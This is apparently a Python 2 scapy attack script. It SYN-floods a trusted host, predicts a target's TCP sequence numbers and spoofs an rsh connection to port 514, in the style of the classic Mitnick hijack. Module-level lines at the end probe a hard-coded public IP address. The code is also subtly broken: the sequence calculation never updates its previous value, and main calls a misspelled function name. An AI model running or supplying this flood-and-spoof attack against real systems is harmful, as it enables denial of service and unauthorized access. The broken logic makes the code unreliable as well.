import optparse
from scapy.all import *

def synFlood(src, tgt):
    for sport in range(1024, 65535):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)

def calTSN(tgt):
    seqNum = 0
    preNum = 0
    diffSeq = 0
    
    for x in range(1, 5):
        if preNum != 0:
            preNum = seqNum

        pkt = IP(dst=tgt) / TCP()
        ans = sr1(pkt, verbose=0)
        seqNum = ans.getlayer(TCP).seq
        diffSeq = seqNum - preNum
        print '[+] TCP seq difference: ' + str(diffSeq)

    return seqNum + diffSeq

def spoofConn(src, tgt, ack):
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514)
    synPkt = IPlayer / TCPlayer
    send(synPkt)
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514, ack=ack)
    ackPkt = IPlayer / TCPlayer
    send(ackPkt)

def main():
    parser = optparse.OptionParser('usage%prog -s <src for SYN flood> -S <src for spoofed connection> -t <target address>')
    parser.add_option('-s', dest='synSpoof', type='string', help='specify src for SYN flood')
    parser.add_option('-S', dest='srcSpoof', type='string', help='specify src for spoofed connection')
    parser.add_option('-t', dest='tgt', type='string', help='specify target address')
    (options, args) = parser.parse_args()

    if options.synSpoof == None or options.srcSpoof == None or options.tgt == None:
        print parser.usage
        exit(0)
    else:
        synSpoof = options.synSpoof
        srcSpoof = options.srcSpoof
        tgt = options.tgt

    print '[+] Starting SYN flood to suppress remote server.'
    synFlood(synSpoof, srcSpoof)
    print '[+] Calculating correct TCP sequence number.'
    seqNum = calTSN(tgt) + 1
    print '[+] Spoofing connection.'
    spoofconn(srcSpoof, tgt, seqNum)
    print '[+] Done.'

if __name__ == '__main__':
    main()

src = '10.1.1.2'
tgt = '184.166.93.82'
seqNum = calTSN(tgt)
print '[+] Next TCP sequence number to ACK is: ' + str(seqNum + 1)
